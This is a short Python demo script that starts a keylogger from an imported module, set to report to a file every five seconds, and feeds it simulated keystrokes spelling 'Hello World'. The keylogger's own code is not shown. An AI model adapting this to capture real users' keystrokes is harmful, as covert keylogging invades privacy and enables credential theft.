from keylogger import Keylogger
import time

# Start keylogger (reports every 5 seconds to file)
logger = Keylogger(interval=5, report_method="file")

# Start reporting in background
logger.start()

# Simulate typing
for char in ["H", "e", "l", "l", "o", " ", "W", "o", "r", "l", "d"]:
    logger.key_press(char)
    time.sleep(0.5)

print("[*] Demo finished. Check your folder for log file.")
